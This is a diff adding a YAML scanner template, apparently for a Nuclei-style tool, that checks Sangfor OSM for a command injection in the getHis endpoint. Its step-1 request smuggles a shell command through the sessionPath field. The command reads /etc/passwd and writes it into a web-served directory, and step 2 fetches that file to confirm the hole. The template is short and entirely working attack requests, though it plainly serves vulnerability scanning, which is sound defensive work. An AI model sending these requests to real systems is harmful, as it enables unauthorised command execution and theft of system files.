@@ -1,0 +1,48 @@
+id: poc-yaml-sangfor-osm-gethis-commond-injection
+info:
+  name: Sangfor OSM getHis Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+  description: |
+    Sangfor OSM (Operations and Security Management) system has a command injection vulnerability in the getHis endpoint, allowing remote attackers to execute arbitrary commands.
+
+variables:
+  t1: "{{rand_base(7)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: step-1
+    method: POST
+    path:
+      - "{{BaseURL}}/isomp-protocol/protocol/getHis"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |
+      sessionPath=;cat%20/etc/passwd>/usr/local/tomcat/webapps/fort/trust/js/{{t1}}.txt;&sid=1
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/fort/trust/js/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
